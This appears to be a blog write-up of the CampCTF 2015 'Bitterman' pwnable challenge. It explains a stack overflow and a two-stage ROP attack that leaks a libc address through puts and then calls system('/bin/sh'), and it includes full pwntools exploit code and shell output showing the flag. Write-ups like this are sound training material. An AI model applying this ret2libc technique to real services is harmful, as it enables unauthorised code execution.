---
layout: post
title:  "CampCTF Bitterman"
date:   2015-08-18 18:03:59
categories: CTF Pwnable
---
Upon connecting, we are given a prompt which asks for the following items:

* Name
* Length of a message
* The message itself

As per normal, let's try the low hanging fruit of throwing lots of data at each field to see if we get a crash.

Turns out, if we say that we will send 1024 bytes and send 1024 bytes, we crash *shrug* (If there is time after the CTF, I'll go back and see what exactly caused the crash)

## Exploit

Because NX is turned on, we need to do some fancy ROP. Our ROP strategy is below:

* Leak a libc address via ROPing to `puts()` with `puts` as the parameter. 
    - This will return the address of `puts` in the libc the binary is using. 
    - We can calculate the libc base address since we were given their libc in the problem (leaked_libc_read_address - original_libc_from_challenge = base_libc_on_server)
* Call main so we can re-exploit with the knowledge of the libc base address.

This ROP construction is here:

```python
from pwn import *

elf = ELF('./bitterman')
rop = ROP(elf)

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

print rop.dump()
```

Leaking the address from this ROP chain and rebasing the libc address in pwntools is below:

```python
# Be sure to add the zeros that we miss due to string read
# Grab the first 8 bytes of our output buffer
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')

# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
```

From here, we can create a second ROP which will simply call `system` with `/bin/sh`. Luckily, `/bin/sh` is in libc, so we simply find where that string is, and call `system` with it.

The second ROP construction is below:

```python
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

print rop2.dump()
```

Our shell is received and the flag is given:

```python
$ ls
bitterman
flag.txt
run.sh
$ cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80
```

## Exploit Code

```python

from pwn import *
import struct
context(arch='amd64')

r = process('./bitterman')
# r = remote('challs.campctf.ccc.ac','10103')

elf = ELF('./bitterman')
libc = ELF('libc.so.6')
# libc = ELF('libc-2.19.so')
rop = ROP(elf)

"""
gdb.attach(r, '''
bp 0x400704
''')
"""

print r.recv()

# raw_input()
### Stack address leaked when filling the name buffer to its max (64 bytes)
# r.sendline('a' * 64)
# leak = r.recv().split()[1][64:72]
r.sendline('')
r.recv()

r.sendline('1024')

####
# Leak read from GOT
# Call main to rethrow exploit with magic libc gadget
###
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

log.info("ROP 1 - read( puts() from GOT); call main")
print rop.dump()

"""
RIP  0x4007e1 (main+245) <-- ret
[-------------------------------CODE-------------------------------]
=> 0x4007e1 <main+245>    ret    
[------------------------------STACK-------------------------------]
00:0000| rsp  0x7fffffffdaf8 <-- 'naaboaabpaabqaa...'
"""

shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
# shellcode = 'B' * (cyclic_find('oaab') - 4)
shellcode += str(rop)

r.clean()
r.sendline(shellcode)

r.recvuntil('Thanks!')

log.info("Sending stage two")

# Be sure to add the zeros that we miss due to string read
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')
log.info("Leak: {}".format(repr(leaked_puts)))
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Reset libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
log.info('Libc address: {}'.format(hex(libc.address)))

# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

log.info("ROP 2:")
print rop2.dump()

r.clean()
raw_input('name')
r.sendline('')
raw_input('length')
r.sendline('1024')

shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
shellcode += str(rop2)

raw_input('send?')
r.sendline(shellcode)

r.interactive()
```
